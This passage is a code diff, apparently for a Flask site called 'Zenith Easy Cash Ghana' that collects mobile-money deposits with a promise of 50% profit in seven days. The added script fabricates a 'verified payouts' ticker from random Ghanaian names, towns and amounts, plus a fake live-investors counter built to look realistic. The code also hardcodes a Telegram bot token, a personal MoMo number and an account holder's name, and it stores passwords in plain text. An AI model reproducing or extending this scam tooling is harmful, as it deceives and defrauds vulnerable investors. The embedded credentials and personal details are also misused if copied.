@@ -1,6 +1,8 @@
 from datetime import datetime, timedelta
 import json
+import math
 import os
+import random
 import time
 import requests
 from flask import (
@@ -26,6 +28,7 @@ TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
 TELEGRAM_CHAT_ID = "8393567505"
 ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"
 
+# 📖 COMPANY ABOUT US SECTION (Configure text here easily!)
 COMPANY_ABOUT_TEXT = (
     "Zenith Easy Cash Ghana is a premier online investment and empowerment platform "
     "dedicated to financial growth across Ghana. We connect smart investors with high-yield "
@@ -33,26 +36,169 @@ COMPANY_ABOUT_TEXT = (
     "Mobile Money (MoMo) or Bank verification."
 )
 
-ZENITH_TICKER_INTERVAL_MS = 4500
-ZENITH_MIN_WITHDRAWAL_MULTIPLE = 2
-ZENITH_MAX_WITHDRAWAL_MULTIPLE = 256
-ZENITH_MAX_VISIBLE_ITEMS = 5
+# Zenith Side Ticker Withdrawal Adjustments (Adjust these values anytime)
+ZENITH_TICKER_INTERVAL_MS = 4500  # How fast new withdrawals appear (in milliseconds)
+ZENITH_MIN_WITHDRAWAL_MULTIPLE = 2  # Minimum multiplier base for random amounts (x100)
+ZENITH_MAX_WITHDRAWAL_MULTIPLE = 256  # Maximum multiplier base for random amounts (x100)
+ZENITH_MAX_VISIBLE_ITEMS = 5  # Max items kept in the sidebar feed at once
 
-ZENITH_SIDEBAR_WIDTH = "120px"
-ZENITH_SIDEBAR_PADDING = "16px"
-ZENITH_SIDEBAR_MAX_HEIGHT = "80vh"
+# 📐 SIDEBAR STYLING CONTROLS (Adjust breadth/thickness here easily!)
+ZENITH_SIDEBAR_WIDTH = "120px"       # Change breadth/width (e.g., '220px' for tin, '340px' for broad)
+ZENITH_SIDEBAR_PADDING = "16px"      # Inner padding of the sidebar card
+ZENITH_SIDEBAR_MAX_HEIGHT = "80vh"   # Maximum vertical height limit
 
+# 🌐 TICKER POOL NAMES & TOWNS CONFIGURATION (Add or modify names/towns here anytime!)
 GHANA_NAMES_POOL = [
+    # Akan (Ashanti, Fante, Akuapem, Bono, etc.)
     "Kwame Mensah", "Kofi Annan", "Kwaku Boateng", "Yaw Osei", "Kojo Frimpong",
     "Kwabena Appiah", "Kwesi Addo", "Kwaku Baffour", "Kofi Owusu", "Kwame Asare",
-    "Kofi Agboka", "Korku Senyo", "Mawuli Dzifa", "Nii Ayi", "Tetteh Mensah",
-    "Mohammed Alhassan", "Abdulai Yakubu", "Ibrahim Salifu", "Fuseini Fuseini"
+    "Kwaku Darko", "Yaw Boakye", "Kofi Sarpong", "Kwabena Agyemang", "Kwesi Bonsu",
+    "Kwame Poku", "Kojo Kwarteng", "Kwaku Antwi", "Yaw Mensah", "Kofi Ofori",
+    "Akosua Agyei", "Abena Mensah", "Yaa Asantewaa", "Adwoa Serwaa", "Afia Kobi",
+    "Amoabea Osei", "Ama Frimpong", "Esi Buahin", "Adwoa Amponsah", "Abena Pokua",
+    "Akosua Owusu", "Yaa Boakyewaa", "Afia Darkowaa", "Ama Serwaa", "Adwoa Addo",
+    "Kwame Boateng-Mensah", "Kofi Acheampong", "Kwaku Tuffour", "Yaw Asiedu", "Kojo Nketia",
+    "Kwabena Kufuor", "Kwesi Bekoe", "Kwaku Duah", "Kofi Odoom", "Kwame Gyasi",
+    "Akosua Nyarko", "Abena Pomaa", "Yaa Gyanma", "Adwoa Tawiah", "Afia Boakyewaa",
+    
+    # Ewe (Volta Region)
+    "Kofi Agboka", "Korku Senyo", "Mawuli Dzifa", "K Mensah", "Togbe Adza",
+    "Kodzo Gbedemah", "Kwami Nyavor", "Eli Kpogli", "Edem Agbeko", "Sena Ablorde",
+    "Korku Gakpetor", "Kwami Ahiable", "Mawuena Agbezudor", "Kofi Tamakloe", "Kodzo Fiadjoe",
+    "Afi Mawusi", "Enyonam Gbeve", "Sena Atitsogbui", "Akofa Agbavor", "Mawuwole Dzradosi",
+    "Dzifa Kumordzie", "Adzo Ametefe", "Afi Agbeko", "Esinam Dogbe", "Selasi Gidiglo",
+    "Korku Asimah", "Kwami Blagogee", "Mawuli Kpikpi", "Kofi Amegatcher", "Kodzo Akakpo",
+    "Akofa Sika", "Enyonam Tsikata", "Sena Wovenu", "Afi Gbedze", "Mawuena Fiawoo",
+    "Dzifa Kportufe", "Adzo Tornyi", "Afi Tengey", "Esinam Avle", "Selasi Nyadedzor",
+    
+    # Ga-Adangbe (Greater Accra)
+    "Nii Ayi", "Tetteh Mensah", "Lartey Owoo", "Okine Ablorh", "Kakai Tagoe",
+    "Nii Armah", "Tetteh Kwei", "Lartey Quaye", "Okine Ankrah", "Kakai Ashong",
+    "Nii Lamptey", "Tetteh Addy", "Lartey Quarcoo", "Okine Ocansey", "Kakai Commey",
+    "Naa Ashorkor", "Naa Dede", "Naa Koshie", "Naa Ayeley", "Naa Shormeh",
+    "Naa Owoo", "Naa Amorkor", "Naa Ablah", "Naa Aklerh", "Naa Korkor",
+    "Nii Tackie", "Tetteh Quaye", "Lartey Adjei", "Okine Bruce", "Kakai Allotey",
+    "Nii Okantey", "Tetteh Hammond", "Lartey Nmai", "Okine Clottey", "Kakai Pappoe",
+    "Naa Ayiku", "Naa Densua", "Naa Ayorkor", "Naa Manye", "Naa Dzama",
+    
+    # Mole-Dagbani & Northern Tribes (Dagomba, Mamprusi, Gonja, Frafra, Kusasi)
+    "Mohammed Alhassan", "Abdulai Yakubu", "Ibrahim Salifu", "Fuseini Fuseini", "Alhassan Mohammed",
+    "Issahak Seidu", "Haruna Zakaria", "Osman Mahama", "Abubakar Tanko", "Mustapha Sulemana",
+    "Alhassan Yakubu", "Abdulai Salifu", "Ibrahim Yakubu", "Fuseini Seidu", "Issahak Mohammed",
+    "Haruna Mahama", "Osman Zakaria", "Abubakar Seidu", "Mustapha Tanko", "Alhassan Sulemana",
+    "Mariama Alhassan", "Zainabu Yakubu", "Fatima Salifu", "Aisha Fuseini", "Halima Mohammed",
+    "Safia Seidu", "Rabi Zakaria", "Aisha Mahama", "Fati Tanko", "Aminata Sulemana",
+    "Kofi Ndebugri", "Akparibo Azantilow", "Atubiga Abugre", "Apam Ayariga", "Awuni Akologo",
+    "Amina Alidu", "Zulaiha Issah", "Latifa Bawa", "Asana Mumuni", "Barikisu Gbeadese",
+    
+    # Akan (Extended / Brong & Fante variations)
+    "Kofi Baidoo", "Kwaku Mensah-Bonsu", "Yaw Annobil", "Kwame Arhin", "Kojo Eghan",
+    "Kwabena Sekyi", "Kwesi Bentsi", "Kwaku Dadzie", "Kofi Essien", "Kwame Ennin",
+    "Akosua Enchil", "Abena Eson", "Yaa Eduful", "Adwoa Ebu", "Afia Eyison",
+    "Kojo Amissah", "Kwaku Eson", "Yaw Appiah-Kubi", "Kofi Asmah", "Kwame Annan",
+    
+    # Other Diverse Groups (Ewe, Guan, Nzema, Krobo)
+    "Kofi Kponor", "Kodzo Tetteh", "Kwami Agbenyega", "Mawuli Gbekor", "Edem Kpobi",
+    "Sena Tameklo", "Afi Gborglah", "Enyonam Akoto", "Dzifa Kpentey", "Selasi Djokoto",
+    "Kaku Ackah", "Kofi Kpole", "Kwaw Blay", "Ezra Kaku", "Kojo Nzema",
+    "Nene Narh", "Nene Oklemekuku", "Kofi Koryekpor", "Tetteh Kportufe", "Mawuena Narh",
+    
+    # Mixed / Contemporary Popular Ghanaian First & Last Name Combinations
+    "Kofi Boateng", "Kwame Darko", "Yaw Ofori", "Kojo Sarpong", "Kwabena Addo",
+    "Kwesi Owusu", "Kwaku Frimpong", "Akosua Mensah", "Abena Osei", "Yaa Appiah",
+    "Adwoa Baffour", "Afia Asare", "Ama Boakye", "Esi Kwarteng", "Kofi Antwi",
+    "Kwame Mensah", "Yaw Tuffour", "Kojo Asiedu", "Kwabena Nketia", "Kwesi Kufuor",
+    "Kwaku Bekoe", "Akosua Duah", "Abena Odoom", "Yaa Gyasi", "Adwoa Nyarko",
+    "Afia Pomaa", "Ama Gyanma", "Esi Tawiah", "Kofi Boakyewaa", "Kwame Acheampong",
+    "Yaw Tetteh", "Kojo Lartey", "Kwabena Okine", "Kwesi Tagoe", "Kwaku Armah",
+    "Akosua Kwei", "Abena Quaye", "Yaa Ankrah", "Adwoa Ashong", "Afia Lamptey"
 ]
-GHANAIAN_TOWNS_POOL = ["Accra", "Tema", "Kumasi", "Obuasi", "Cape Coast", "Koforidua", "Takoradi", "Ho", "Sunyani", "Tamale"]
+GHANAIAN_TOWNS_POOL = [
+    # Greater Accra Region
+    "Accra", "Tema", "Dodowa", "Oyibi", "Ada Foah", "Sege", "Prampram", 
+    "Amasaman", "Abokobi", "Madina", "Ashaiman", "Teshie", "Nungua", 
+    "Lashibi", "Dome", "Gbawe", "Weija", "Ofankor", "Taifa", "Nima", 
+    "Osu", "Labadi", "Dansoman", "Achimota", "Kaneshie", "East Legon", 
+    "Cantonments", "Spintex", "Lapaz", "Kwabenya", "Tesano", "Haatso",
+
+    # Ashanti Region
+    "Kumasi", "Obuasi", "Asante Mampong", "Ejisu", "Konongo", "Offinso", 
+    "Asante Bekwai", "Agogo", "Juaso", "Juaben", "Ejura", "Tepa", 
+    "Kumawu", "Nsuta", "Mamponten", "Nkawie", "Kokofu", "Jacobu", 
+    "Akrokeri", "Fomena", "Nyinahin", "Bonwire", "Barekese", "Asokore", 
+    "Adum", "Bantama", "Ahodwo", "Asafo", "Suame", "Tafo", "Kwadaso", "Ejisu",
+
+    # Central Region
+    "Cape Coast", "Kasoa", "Assin Foso", "Agona Swedru", "Elmina", 
+    "Winneba", "Mankessim", "Dunkwa-on-Offin", "Saltpond", "Apam", 
+    "Komenda", "Moree", "Yamoransa", "Anomabo", "Kormantse", "Awutu Bereku", 
+    "Senya Bereku", "Bawjiase", "Kwanyako", "Agona Nsaba", "Jukwa", "Twifo Praso",
+
+    # Eastern Region
+    "Koforidua", "Nkawkaw", "Suhum", "Kyebi", "Akwatia", "Kade", 
+    "Asamankese", "Adeiso", "Nsawam", "Akim Oda", "Aburi", "Akuapem Mampong", 
+    "Akosombo", "Somanya", "Akropong", "Adukrom", "Mamfe", "Larteh", 
+    "Abetifi", "Mpraeso", "Nkwatia", "Anyinam", "Donkorkrom", "Krobo Odumase",
+
+    # Western Region
+    "Sekondi", "Takoradi", "Tarkwa", "Axim", "Prestea", "Effiakuma", 
+    "Agona Nkwanta", "Bogoso", "Elubo", "Half Assini", "Shama", "Mpohor", 
+    "Daboase", "Apowa", "Dixcove", "Busua", "Kwesimintsim", "Essikado",
+
+    # Western North Region
+    "Sefwi Wiawso", "Bibiani", "Enchi", "Juaboso", "Akontombra", "Dadieso", 
+    "Essam", "Bodi", "Sefwi Bekwai", "Awaso",
+
+    # Volta Region
+    "Ho", "Aflao", "Hohoe", "Keta", "Kpandu", "Amlakpe", "Denu", 
+    "Sogakope", "Adidome", "Akatsi", "Anloga", "Jasikan", "Kadjebi", 
+    "Nkonya", "Volo", "Abor", "Agbozume", "Dzodze",
+
+    # Oti Region
+    "Dambai", "Kpandai", "Nkwanta", "Chinderi", "Borada", "Brewaniase", 
+    "Kpassa", "Jasikan", "Likpe", "Guaman",
+
+    # Bono Region
+    "Sunyani", "Berekum", "Dormaa Ahenkro", "Wenchi", "Nsawkaw", "Seikwa", 
+    "Drobo", "Japekrom", "Badu", "Chiraa", "Wamanafo", "Kwatire",
+
+    # Bono East Region
+    "Techiman", "Kintampo", "Atebubu", "Yeji", "Prang", "Nkoranza", 
+    "Amanten", "Kwame Danso", "Tuobodom", "Busunya", "Kajaji",
+
+    # Ahafo Region
+    "Goaso", "Duayaw Nkwanta", "Bechem", "Hwidiem", "Kenyasi", "Yamfo", 
+    "Ntotroso", "Kukuom", "Alavanyo", "Asumura",
+
+    # Northern Region
+    "Tamale", "Yendi", "Bimbilla", "Savelugu", "Zabzugu", "Gushegu", 
+    "Karaga", "Kumbungu", "Tolon", "Nanton", "Saboba", "Salaga",
+
+    # Savannah Region
+    "Damongo", "Bole", "Salaga", "Buipe", "Sawla", "Daboya", "Tuna", 
+    "Larabanga", "Mankarigu", "Kpandae",
+
+    # North East Region
+    "Nalerigu", "Walewale", "Gambaga", "Chereponi", "Nakpanduri", 
+    "Bunkpurugu", "Yagaba", "Kpasenkpe", "Gbintiri", "Wungu",
+
+    # Upper East Region
+    "Bolgatanga", "Bawku", "Navrongo", "Paga", "Zebilla", "Sandema", 
+    "Bongo", "Tongo", "Garu", "Tempane", "Pusiga", "Fumbisi",
+
+    # Upper West Region
+    "Wa", "Tumu", "Lawra", "Nandom", "Jirapa", "Gwollu", "Nadowli", 
+    "Handuri", "Duori", "Eremon", "Funsi", "Lambussie"
+]
+
+# ==========================================
 
 app = Flask(__name__)
 app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"
 
+# ==========================================
+# 🗄️ RENDER PERSISTENT DISK PATH CONFIGURATION
+# ==========================================
 DISK_PATH = os.environ.get("RENDER_DISK_PATH", "")
 if not DISK_PATH and os.path.exists("/var/data"):
     DISK_PATH = "/var/data"
@@ -67,88 +213,212 @@ else:
     UPLOAD_FOLDER = "uploads"
 
 app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
+
 if not os.path.exists(UPLOAD_FOLDER):
   os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"
 
+
 def send_telegram_alert(message, photo_path=None):
-  if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or not TELEGRAM_BOT_TOKEN:
+  if (
+      TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN"
+      or not TELEGRAM_BOT_TOKEN
+  ):
     return
   try:
     if photo_path and os.path.exists(photo_path):
       url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
       with open(photo_path, "rb") as photo_file:
-        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": message, "parse_mode": "HTML"}, files={"photo": photo_file}, timeout=10)
+        requests.post(
+            url,
+            data={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "caption": message,
+                "parse_mode": "HTML",
+            },
+            files={"photo": photo_file},
+            timeout=10,
+        )
     else:
       url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-      requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=5)
+      payload = {
+          "chat_id": TELEGRAM_CHAT_ID,
+          "text": message,
+          "parse_mode": "HTML",
+      }
+      requests.post(url, json=payload, timeout=5)
   except Exception as e:
     print(f"Telegram alert error: {e}")
 
+
 def load_settings():
-  default_settings = {"momo_number": "0551338991", "momo_name": "EMELIA DOOWELPOUR"}
+  default_settings = {
+      "momo_number": "0551338991",
+      "momo_name": "EMELIA DOOWELPOUR",
+  }
   if not os.path.exists(SETTINGS_FILE):
     try:
-      with open(SETTINGS_FILE, "w") as f: json.dump(default_settings, f, indent=4)
-    except Exception: pass
+      with open(SETTINGS_FILE, "w") as f:
+        json.dump(default_settings, f, indent=4)
+    except Exception:
+      pass
     return default_settings
   try:
-    with open(SETTINGS_FILE, "r") as f: return json.load(f)
-  except Exception: return default_settings
+    with open(SETTINGS_FILE, "r") as f:
+      return json.load(f)
+  except Exception:
+    return default_settings
+
 
 def save_settings(settings):
   try:
-    with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
-  except Exception as e: print(f"Error saving settings: {e}")
+    with open(SETTINGS_FILE, "w") as f:
+      json.dump(settings, f, indent=4)
+  except Exception as e:
+    print(f"Error saving settings: {e}")
+
 
 def load_investors():
-  if not os.path.exists(DATA_FILE): return []
+  if not os.path.exists(DATA_FILE):
+    return []
   try:
     with open(DATA_FILE, "r") as f:
       data = json.load(f)
-      if isinstance(data, dict): return [data]
-      if isinstance(data, list): return data
+      if isinstance(data, dict):
+        return [data]
+      if isinstance(data, list):
+        return data
       return []
-  except Exception: return []
+  except Exception:
+    return []
+
 
 def save_all_investors(investors):
   try:
-    with open(DATA_FILE, "w") as f: json.dump(investors, f, indent=4)
-  except Exception as e: print(f"Error saving investors data: {e}")
+    with open(DATA_FILE, "w") as f:
+      json.dump(investors, f, indent=4)
+  except Exception as e:
+    print(f"Error saving investors data: {e}")
 
-def hashlib_sig(val):
-  import hashlib
-  return hashlib.md5(val.encode("utf-8")).hexdigest()
+
+def save_investor_data(data):
+  investors = load_investors()
+  number = data.get("number")
+  found_user = False
+  for inv in investors:
+    if inv.get("number") == number:
+      inv["password"] = data.get("password", inv.get("password"))
+      inv["name"] = data.get("name", inv.get("name"))
+      inv["work"] = data.get("work", inv.get("work"))
+      inv["region"] = data.get("region", inv.get("region"))
+      if data.get("profile_pic"):
+        inv["profile_pic"] = data.get("profile_pic")
+
+      if "investments" not in inv:
+        inv["investments"] = [
+            {
+                "amount": inv.get("amount"),
+                "expected_return": inv.get("expected_return"),
+                "transaction_id": inv.get("transaction_id"),
+                "screenshot": inv.get("screenshot"),
+                "date_time": inv.get("date_time"),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
+                "status": inv.get("status"),
+            }
+        ]
+      inv["investments"].append(
+          {
+              "amount": data["amount"],
+              "expected_return": data["expected_return"],
+              "transaction_id": data["transaction_id"],
+              "screenshot": data["screenshot"],
+              "date_time": data["date_time"],
+              "maturity_date": data["maturity_date"],
+              "status": data["status"],
+          }
+      )
+      found_user = True
+      break
+
+  if not found_user:
+    data["investments"] = [
+        {
+            "amount": data["amount"],
+            "expected_return": data["expected_return"],
+            "transaction_id": data["transaction_id"],
+            "screenshot": data["screenshot"],
+            "date_time": data["date_time"],
+            "maturity_date": data["maturity_date"],
+            "status": data["status"],
+        }
+    ]
+    investors.append(data)
+
+  save_all_investors(investors)
+
 
 ZENITH_ALERTS_TOP_HTML = f"""
 <style>
-    #zenithAlertsBanner {{ background: linear-gradient(135deg, #0b130b, #132e13); border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px; margin-bottom: 20px; border-radius: 6px; }}
+    #zenithAlertsBanner {{
+        background: linear-gradient(135deg, #0b130b, #132e13);
+        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
+        margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        font-family: Arial, sans-serif; overflow: hidden; position: relative;
+    }}
     .alerts-header {{ font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }}
     .marquee-container {{ overflow: hidden; white-space: nowrap; width: 100%; position: relative; }}
     .marquee-text {{ display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }}
     .marquee-text b {{ color: #facc15; }}
     @keyframes marquee {{ 0% {{ transform: translate(0, 0); }} 100% {{ transform: translate(-100%, 0); }} }}
+    .live-online-counter {{ background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }}
 </style>
+<div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
 <div id="zenithAlertsBanner">
-    <div class="alerts-header"><span>🟢 Live Zenith Verified Payouts</span></div>
+    <div class="alerts-header"><span>🟢 Live Zenith Verified Payouts</span><span>Secure Mobile Money Feed</span></div>
     <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
 </div>
 <script>
     const ghanaNames = {json.dumps(GHANA_NAMES_POOL)};
     const towns = {json.dumps(GHANAIAN_TOWNS_POOL)};
+    const roundInvestments = [250, 300, 400, 500, 600, 750, 800, 1000, 1200, 1500, 2000, 2500, 3000, 4000, 5000];
+    const configuredBaseOnline = {ONLINE_USERS_BASE};
+    
     function generateTickerMessages() {{
         let messages = [];
-        for (let i = 0; i < 5; i++) {{
+        for (let i = 0; i < 8; i++) {{
             const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
             const town = towns[Math.floor(Math.random() * towns.length)];
-            messages.push(`🟢 <b>${{name}}</b> (${{town}}) successfully cashed out Capital + 50% Profit via MoMo!`);
+            const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
+            const total = base * 1.5;
+            messages.push(`🟢 <b>${{name}}</b> (${{town}}) successfully cashed out Capital + 50% Profit = <b>GHs ${{total.toLocaleString()}}</b> via MoMo!`);
         }}
         const el = document.getElementById('alertsText');
         if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
     }}
     generateTickerMessages();
     setInterval(generateTickerMessages, 22000);
+
+    let currentOnline = configuredBaseOnline;
+    function updateOnlineCounter() {{
+        const hour = new Date().getHours();
+        let fluctuation = Math.floor(Math.random() * 40) - 20;
+        
+        if (hour >= 0 && hour < 6) {{
+            let nightBase = Math.floor(configuredBaseOnline * 0.2);
+            currentOnline = nightBase + fluctuation;
+            currentOnline = Math.max(50, currentOnline);
+        }} else {{
+            currentOnline = configuredBaseOnline + fluctuation;
+        }}
+        
+        const counterEl = document.getElementById('liveOnlineCounter');
+        if (counterEl) {{
+            counterEl.innerHTML = `🟢 Live: <b>${{currentOnline.toLocaleString()}}</b> Verified Investors Online Right Now`;
+        }}
+    }}
+    updateOnlineCounter();
+    setInterval(updateOnlineCounter, 7000);
 </script>
 """
 
@@ -156,38 +426,224 @@ HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>Zenith Easy Cash Ghana</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zenith Easy Cash Ghana - Registration & Portal</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
-        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
         h2, h3 { color: #028a0f; text-align: center; }
+        
+        .about-company-card { background: #f8fafc; border: 1px solid #cbd5e1; border-left: 5px solid #0284c7; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; }
+        .about-company-card h4 { margin: 0 0 6px 0; color: #0369a1; font-size: 14px; }
+
+        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #22c55e; }
+        .process-guide h4 { color: #4ade80; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
+        .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.7; }
+        .process-steps li { margin-bottom: 6px; }
+        
+        .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; }
         input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
         button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #1b5e20; }
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
+        .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
+        .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
+        .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
+        
+        .password-step-container { display: none; background: #f0fdf4; padding: 15px; border: 1px solid #bbf7d0; border-radius: 6px; margin-bottom: 15px; }
+        
+        .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
+        .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
+        .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+        .track-password-group { display: none; margin-top: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         {{ zenith_alerts_top_html|safe }}
         <h2>Zenith Easy Cash Ghana</h2>
-        <h3>Online Investor Registration</h3>
+        <h3>Online Investor Registration & Portal</h3>
+
+        <div class="about-company-card">
+            <h4>ℹ️ About Our Company</h4>
+            <p style="margin:0;">{{ company_about }}</p>
+        </div>
+
+        <div class="process-guide">
+            <h4>📋 Simple Registration & Investment Process</h4>
+            <ol class="process-steps">
+                <li><b>Step 1: Send Your Capital</b> – Transfer your investment amount (Min 200 GHs) directly to the Official Company MoMo details provided below.</li>
+                <li><b>Step 2: Complete the Form</b> – Fill in your details, account password, and paste your MoMo Transaction ID or attach receipt screenshot.</li>
+                <li><b>Step 3: Admin Instant Verification</b> – Upon submission, your details are instantly routed for account approval.</li>
+                <li><b>Step 4: Investment Start & Payout</b> – Your 7-day maturity countdown starts immediately after admin approval to yield your <b>50% profit payout</b>!</li>
+            </ol>
+        </div>
+
+        <div class="momo-box">
+            <strong>OFFICIAL COMPANY MOMO NUMBER:</strong> {{ settings.momo_number }}<br>
+            <strong>ACCOUNT NAME:</strong> {{ settings.momo_name }}
+        </div>
+
         {% with messages = get_flashed_messages() %}
-          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
+          {% if messages %}
+            <div class="flash">{{ messages[0] }}</div>
+          {% endif %}
         {% endwith %}
-        <form method="POST" enctype="multipart/form-data">
-            <div class="form-group"><label>Phone Number:</label><input type="text" name="number" required placeholder="e.g., 0501234567"></div>
-            <div class="form-group"><label>Password:</label><input type="password" name="password" required></div>
-            <div class="form-group"><label>Full Name:</label><input type="text" name="name" required></div>
-            <div class="form-group"><label>Investment Amount (GHs):</label><input type="number" name="amount" min="200" required></div>
-            <div class="form-group"><label>Work / Job:</label><input type="text" name="work" required></div>
-            <div class="form-group"><label>Region / Town:</label><input type="text" name="region" required></div>
-            <div class="form-group"><label>Transaction ID / Screenshot:</label><input type="text" name="transaction_id"><input type="file" name="payment_screenshot" accept="image/*"></div>
-            <button type="submit">Submit Registration</button>
+
+        <form method="POST" action="{{ url_for('index') }}" enctype="multipart/form-data" id="registrationForm" onsubmit="return validatePasswordMatch(event)">
+            <div class="form-group">
+                <label>Phone Number (Enter first to continue):</label>
+                <input type="text" name="number" id="phoneInput" required placeholder="e.g., 0501234567" oninput="checkNumberEntered()">
+            </div>
+
+            <div id="passwordContainer" class="password-step-container">
+                <div class="form-group">
+                    <label>Account Password:</label>
+                    <input type="password" name="password" id="passInput" placeholder="Create a secure login password">
+                </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label>Confirm Account Password:</label>
+                    <input type="password" id="confirmPassInput" placeholder="Confirm your login password">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Full Name:</label>
+                <input type="text" name="name" required placeholder="Enter your full name">
+            </div>
+            <div class="form-group">
+                <label>Investment Amount (GHs):</label>
+                <input type="number" name="amount" step="1" min="200" max="500000" required placeholder="Min 200 - Max 500,000">
+            </div>
+            <div class="form-group">
+                <label>Work / Job:</label>
+                <input type="text" name="work" required placeholder="Your occupation">
+            </div>
+            <div class="form-group">
+                <label>Region / Town:</label>
+                <input type="text" name="region" required placeholder="e.g., Accra, Kumasi">
+            </div>
+            <div class="form-group">
+                <label>Payment Proof (Transaction ID OR Screenshot):</label>
+                <input type="text" name="transaction_id" placeholder="Enter MoMo Transaction ID">
+                <div style="margin-top: 8px;">
+                    <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0;">
+                    <small style="color: #666;">Upload payment screenshot image</small>
+                </div>
+            </div>
+            <button type="submit">Submit Registration & Open Dashboard</button>
         </form>
-        <div style="text-align:center; margin-top:15px;"><a href="{{ url_for('login') }}">Investor Login</a> | <a href="{{ url_for('admin_login') }}">Admin Login</a></div>
+
+        <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
+        <div class="nav-links">
+            <a href="{{ url_for('login') }}">🔑 Investor Login</a>
+        </div>
+
+        <div class="tracker-section">
+            <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
+            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number below to check your live status.</p>
+            <div class="form-group">
+                <label style="font-size: 13px;">Registered Phone Number:</label>
+                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;" oninput="checkTrackNumberEntered()">
+                
+                <div id="trackPasswordGroup" class="track-password-group">
+                    <label style="font-size: 13px;">Account Password:</label>
+                    <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
+                </div>
+
